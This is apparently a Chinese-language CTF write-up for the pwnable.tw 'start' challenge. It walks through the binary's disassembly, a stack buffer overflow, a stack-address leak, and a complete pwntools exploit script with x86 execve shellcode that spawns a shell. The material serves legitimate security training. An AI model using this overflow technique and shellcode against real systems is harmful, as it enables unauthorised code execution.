---
title: pwnable.tw::start
date: 2023-10-17 21:28:10
tags: pwn
---

## 保護機制
Nope

## 分析
程式僅有一OEP (entry 0)
```asm
┌ 61: entry0 ();
│           0x08048060      54             push esp                    ; [01] -r-x section size 67 named .text
│           0x08048061      689d800408     push loc._exit              ; 0x804809d ; "\1\xc0@\u0340\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"                                                         
│           0x08048066      31c0           xor eax, eax
│           0x08048068      31db           xor ebx, ebx
│           0x0804806a      31c9           xor ecx, ecx
│           0x0804806c      31d2           xor edx, edx
│           0x0804806e      684354463a     push 0x3a465443             ; 'CTF:'
│           0x08048073      6874686520     push 0x20656874             ; 'the '
│           0x08048078      6861727420     push 0x20747261             ; 'art '
│           0x0804807d      6873207374     push 0x74732073             ; 's st'
│           0x08048082      684c657427     push 0x2774654c             ; 'Let''
│           0x08048087      89e1           mov ecx, esp
│           0x08048089      b214           mov dl, 0x14                ; 20
│           0x0804808b      b301           mov bl, 1
│           0x0804808d      b004           mov al, 4
│           0x0804808f      cd80           int 0x80
│           0x08048091      31db           xor ebx, ebx
│           0x08048093      b23c           mov dl, 0x3c                ; '<' ; 60
│           0x08048095      b003           mov al, 3
│           0x08048097      cd80           int 0x80
│           0x08048099      83c414         add esp, 0x14
└           0x0804809c      c3             ret
```
先是把字串”Let’s start the CTF:”印出, 接著用`read()`讀了 60 bytes造成overflow

然後就沒了, 非常簡單

接著就是想辦法用 ret2shellcode拿到shell, 但stack位置無從得知, 必須想辦法找Gadget leak stack

仔細觀察組語可以發現在`0x08048087`處一路執行下去, 可以用write把ESP印出來
## exploit
先控制EIP跳轉到`0x08048087`後, 再跳轉回主程式, 將shellcode寫到stack上然後getshell

小坑點:

因為輸入長度只有60, 不能使用shellcraft, 可以到shellstorm上面找x86 shellcode
為了穩定, 使用`send()`, 而不是`sendline()`
```python
#!/usr/bin/env python2

from pwn import *

p = remote('chall.pwnable.tw', 10000)
context.log_level = 'debug'
context.arch = 'i386'

#first stage (leak stack)
payload = 'A'*0x14 + p32(0x08048087)
p.recvuntil("Let's start the CTF:")
p.send(payload)
#print p.recv(4)
esp = u32(p.recv(4))
print '[+]Stack at:{}'.format(hex(esp))

#second stage
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
payload = 'A'*0x14 + p32(esp + 0x14) + shellcode 
p.sendline(payload)

p.interactive()
p.close()
```